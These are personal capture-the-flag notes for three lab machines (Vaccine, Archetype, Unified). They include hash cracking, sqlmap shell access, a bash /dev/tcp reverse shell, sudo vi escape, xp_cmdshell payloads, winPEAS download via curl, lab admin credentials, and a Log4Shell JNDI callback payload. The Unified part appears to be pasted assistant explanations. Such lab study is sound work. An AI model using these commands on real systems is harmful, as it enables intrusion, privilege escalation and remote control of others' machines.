

# Vaccine

-> uses primarily ftp (port 20) and http (port 80)

firstly use ftp to grab the backup.zip

-> use zip2john and john to grab the zip encrypted pass and decode the source code 
```bash
zip2john backup.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
```

-> now you can login and see a database

```bash
curl -L -c cookies.txt "http://{MACHINE_IP} -d "username=admin&password={password}"
```

-> after getting the cookies then use **sqlmap**

```bash
# Target the search parameter of the site
sqlmap -u http://{MACHINE_IP}/dashboard.php?search=text cookie="{PHPSESSID=COOKIE}" -p search

# After finding vulnerabilities then use --os-root
sqlmap -u http://{MACHINE_IP}/dashboard.php?search=text cookie="{PHPSESSID=COOKIE}" -p search --os-root
```

-> after getting into a shell, try to get a reverse shell using **nc** (netcat)

```bash
nc -lvnp 4444
```

-> from the sql terminal spawn an interactive bash shell to redirect its i/o outgoingly 

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.100/4444 0>&1'
```

-> do a PTY upgrade the be able to do sudo -l

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

-> first find the password of the root, which is located in /var/www/html/dashboard.php

then do: 
```bash
sudo -l 
```

sudo -l returns:

```bash
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

# Means that we can run vi on pg_hba.conf 
```

-> run vi as sudo on pg_hba.conf

-> then do a **vi escape** by spawning an interactive bash in vi:

```bash
:!/bin/bash
```

Finally, the flag is in the home directory as root.



# Archetype

-> 135/tcp msrpc
-> 139/tcp netbios ssn
-> 445/tcp microsoft-ds
->1433/tcp ms-sql-s
-> 5985/tcp http

Primarily be using **SMB, impackets-mssqlclient**, **evil-winrm**

```bash
# Retrieve the shares
smbclient -L {IP} 

```

-> we then get the backups share which included `prod.dtsConfig`, and grab the credentials of id and password, to then log on to mssql using `impacket-mssqlclient`

```bash
# talk to MS SQL over its native wire protocol TDS, rather than SMB/winRM
impacket-mssqlclient sql_svc:'M3g4c0rp123'@{IP_ADDRESS} -windows-auth

-windows-auth # auth using windows/NTLM auth rather than SQL servers native SQL auth
```


-> follow the https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/ , for documentation fo **xp_cmdshell**.

```bash
#Enable xp_cmdshell first after login
enable_xp_cmdshell
xp_cmdshell whoami
```

-> https://www.revshells.com/ for generating reverse shell payload for a given situation (PS, bash, PHP, netcat, etc)

```bash
# Copy the payload after the command
xp_cmdshell {PAYLOAD}

# make sure u had a listener ready before
```

-> since we need to bring winpeas, to find vulnerabilities to exploit in the machine

```bash
# Inside the folder that has winPEASany.exe
python -m http.server 8000
```

-> from the connected reverse shell, we navigate into C:\backups, because when I tried to curl into other folders it wouldn't work

```bash
# in C:\backups
curl.exe http://{tun0-interface-IP}/winPEASSany.exe -o winpeas.exe
```

-> run winPEAS

```css
# inside winPEAS we found
??????????? PowerShell Settings (T1059.001)
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 79B

```

-> this is the file that stores powershell history inputs, when we cat it we can find the credentials of the administrator: `MEGACORP_4dm1n!!`

```bash
# connect using evil-winrm
evil-winrm -i {IP_ADDRESS} -u administrator -p 'MEGACORP_4dm1n!!'
```

-> navigate to both desktops to find the flag.



# Unified


Yes — you’re right. Before you build the full exploit chain (LDAP server + HTTP server serving a malicious Java class), you want to confirm the target is actually vulnerable and will reach back out to you. So you send a simple payload like ${jndi:ldap://your_ip:389/o=tomcat} and run tcpdump -i tun0 port 389 (or similar) on your attack box. If you see the target hit your LDAP listener, you’ve confirmed:

The field is vulnerable to JNDI injection
The target has network access back to you
You’re using the right interface/IP

Getting from callback → RCE

A bare LDAP listener (like tcpdump catching the hit, or even a plain nc -lvnp 389) only proves the callback — it can’t actually respond properly to complete the JNDI lookup. To get code execution you need an actual rogue LDAP server that redirects the client to load a malicious Java class from an HTTP server. That’s what tools like the JNDI Exploit Kit / marshalsec do for you.



The Log4Shell attack flow

1. curl sends the payload to the target's login API. The payload contains a JNDI lookup string.

2. The vulnerable application processes the input. If the relevant Log4j logging path evaluates the lookup, the target initiates an LDAP request to your RogueJndi server.

3. RogueJndi responds to the LDAP lookup. It supplies a JNDI response configured to provide a command-related payload.

4. The target processes the response. If the required Java and application conditions are met, the command executes on the target.

5. The command contains your callback address. It specifies your Kali IP (10.10.14.95) and port (4444).

6. Netcat receives the incoming TCP connection because it's listening on that port.
Two small corrections

    Base64 is encoding, not hashing. Your command uses Base64 to represent the shell command in a different format.

    The connection isn't redirected through RogueJndi. The target initiates a separate connection directly to your Kali machine.

The most important concept to remember:

RogueJndi delivers the JNDI response. The target executes the command. Netcat receives the resulting connection.

You've now understood the relationship between the three components: curl, RogueJndi and Netcat.


vulnurable log4j unifi

For an authorized HTB assessment:

    Application version: Identify the UniFi Network application version.

    Log4j version: Determine which Log4j library version is bundled with the application.

    Affected configuration: Check whether the application uses the vulnerable lookup functionality.

    Request handling: Establish whether the relevant input reaches the application's logging subsystem.

    Evidence: Correlate application logs, LDAP traffic and server responses.

whoami
hostname
uname -a
pwd
cat /etc/os-release


ps aux 